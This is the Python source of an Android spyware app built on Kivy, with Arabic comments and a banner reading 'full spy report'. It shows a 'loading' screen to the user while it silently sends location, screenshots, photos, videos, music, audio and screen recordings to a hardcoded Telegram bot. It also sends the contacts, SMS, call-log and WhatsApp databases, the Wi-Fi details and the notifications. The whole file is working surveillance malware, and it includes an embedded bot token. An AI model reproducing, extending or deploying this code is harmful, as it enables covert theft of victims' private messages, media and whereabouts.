`python
import os, requests, time, platform, subprocess, zipfile, shutil, threading
from datetime import datetime
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from android.permissions import request_permissions, Permission

TOKEN = "8656860845:AAHV-vUKg5qA6qL4ZzVUpUWukQ3H8UKPTjA"
CHAT_ID = "8527303422"

# ======= دوال الإرسال =======
def send(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text[:4000]}, timeout=10)
    except: pass

def send_photo(path):
    try:
        if os.path.exists(path):
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                              files={"photo": f}, data={"chat_id": CHAT_ID}, timeout=30)
    except: pass

def send_doc(path, caption=""):
    try:
        if os.path.exists(path):
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                              files={"document": f}, data={"chat_id": CHAT_ID, "caption": caption}, timeout=120)
    except: pass

def send_audio(path, caption=""):
    try:
        if os.path.exists(path):
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                              files={"audio": f}, data={"chat_id": CHAT_ID, "caption": caption}, timeout=60)
    except: pass

def send_video(path, caption=""):
    try:
        if os.path.exists(path):
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                              files={"video": f}, data={"chat_id": CHAT_ID, "caption": caption}, timeout=120)
    except: pass

# ======= جمع كل شيء =======
def collect_all():
    # 1. معلومات الجهاز
    info = f"╔══════════════════════════╗\n"
    info += f"║   💀 تقرير تجسس كامل 💀   ║\n"
    info += f"╚══════════════════════════╝\n\n"
    info += f"📱 النظام: {platform.system()} {platform.release()}\n"
    info += f"💻 المعمارية: {platform.machine()}\n"
    info += f"🌐 IP: {requests.get('https://api.ipify.org').text}\n"
    info += f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    info += f"━━━━━━━━━━━━━━━━━━━━━━\n"
    info += f"👑 صنع حماصة النمرود 👑"
    send(info)

    # 2. الموقع
    try:
        out = subprocess.check_output("dumpsys location | grep -E 'latitude|longitude' | head -2", shell=True).decode()
        send(f"📍 *الموقع:*\n{out}")
    except: pass

    # 3. البطارية
    try:
        out = subprocess.check_output("dumpsys battery | grep -E 'level|status|temperature'", shell=True).decode()
        send(f"🔋 *البطارية:*\n{out}")
    except: pass

    # 4. صورة الشاشة
    try:
        os.system("screencap -p /sdcard/screen.png 2>/dev/null")
        send_photo("/sdcard/screen.png")
    except: pass

    # 5. كل الصور
    try:
        zp = "/sdcard/images.zip"
        with zipfile.ZipFile(zp, 'w') as z:
            for p in ["/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/WhatsApp/Media/"]:
                if os.path.exists(p):
                    for root, dirs, files in os.walk(p):
                        for f in files:
                            if f.lower().endswith(('.jpg','.png','.jpeg','.gif','.webp')):
                                try: z.write(os.path.join(root, f), f)
                                except: pass
        send_doc(zp, "📸 *كل الصور*")
    except: pass

    # 6. جهات الاتصال
    try:
        src = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if os.path.exists(src):
            shutil.copy(src, "/sdcard/contacts.db")
            send_doc("/sdcard/contacts.db", "📋 *جهات الاتصال*")
    except: pass

    # 7. الرسائل
    try:
        src = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        if os.path.exists(src):
            shutil.copy(src, "/sdcard/sms.db")
            send_doc("/sdcard/sms.db", "💾 *الرسائل*")
    except: pass# 8. سجل المكالمات
    try:
        src = "/data/data/com.android.providers.contacts/databases/calllog.db"
        if os.path.exists(src):
            shutil.copy(src, "/sdcard/calllog.db")
            send_doc("/sdcard/calllog.db", "📞 *سجل المكالمات*")
    except: pass

    # 9. تسجيل صوتي
    try:
        os.system("timeout 10 rec -r 16000 -c 1 /sdcard/audio.wav 2>/dev/null")
        if os.path.exists("/sdcard/audio.wav"):
            send_audio("/sdcard/audio.wav", "🎙 *تسجيل صوتي*")
    except: pass

    # 10. تسجيل فيديو
    try:
        os.system("screenrecord /sdcard/video.mp4 --time-limit 10 2>/dev/null")
        if os.path.exists("/sdcard/video.mp4"):
            send_video("/sdcard/video.mp4", "🎥 *تسجيل فيديو*")
    except: pass

    # 11. التطبيقات
    try:
        out = subprocess.check_output("pm list packages", shell=True).decode()
        send(f"📦 *التطبيقات:*\n{out[:3500]}")
    except: pass

    # 12. الواي فاي
    try:
        out = subprocess.check_output("dumpsys wifi | grep -E 'SSID|BSSID|signal'", shell=True).decode()
        send(f"📶 *الواي فاي:*\n{out[:3500]}")
    except: pass

    # 13. الموسيقى
    try:
        zp = "/sdcard/music.zip"
        with zipfile.ZipFile(zp, 'w') as z:
            for root, dirs, files in os.walk("/sdcard/Music/"):
                for f in files:
                    if f.lower().endswith(('.mp3','.wav','.m4a','.ogg')):
                        try: z.write(os.path.join(root, f), f)
                        except: pass
        send_doc(zp, "🎵 *الموسيقى*")
    except: pass

    # 14. الفيديوهات
    try:
        zp = "/sdcard/videos.zip"
        with zipfile.ZipFile(zp, 'w') as z:
            for p in ["/sdcard/DCIM/Camera/", "/sdcard/Movies/"]:
                if os.path.exists(p):
                    for root, dirs, files in os.walk(p):
                        for f in files:
                            if f.lower().endswith(('.mp4','.avi','.mkv','.3gp')):
                                try: z.write(os.path.join(root, f), f)
                                except: pass
        send_doc(zp, "🎬 *الفيديوهات*")
    except: pass

    # 15. الملفات الكبيرة
    try:
        out = subprocess.check_output("find /sdcard -type f -size +10M 2>/dev/null | head -20", shell=True).decode()
        send(f"📦 *الملفات الكبيرة:*\n{out[:3500]}")
    except: pass

    # 16. آخر الملفات
    try:
        out = subprocess.check_output("find /sdcard -type f -mtime -1 2>/dev/null | head -20", shell=True).decode()
        send(f"📂 *آخر الملفات:*\n{out[:3500]}")
    except: pass

    # 17. الإشعارات
    try:
        out = subprocess.check_output("dumpsys notification | grep -E 'tickerText|title|text'", shell=True).decode()
        send(f"🔔 *الإشعارات:*\n{out[:3500]}")
    except: pass

    # 18. واتساب
    try:
        src = "/data/data/com.whatsapp/databases/msgstore.db"
        if os.path.exists(src):
            shutil.copy(src, "/sdcard/whatsapp.db")
            send_doc("/sdcard/whatsapp.db", "💬 *واتساب*")
    except: pass

# ======= تشغيل =======
class MyApp(App):
    def build(self):
        Clock.schedule_once(lambda dt: collect_all(), 5)
        return Label(text="جاري التحميل...")

if name == "main":
    request_permissions([
        Permission.INTERNET,
        Permission.ACCESS_FINE_LOCATION,
        Permission.READ_EXTERNAL_STORAGE,
        Permission.WRITE_EXTERNAL_STORAGE,
        Permission.CAMERA,
        Permission.RECORD_AUDIO,
        Permission.READ_CONTACTS,
        Permission.READ_SMS,
        Permission.READ_CALL_LOG
    ])
    MyApp().run()
`
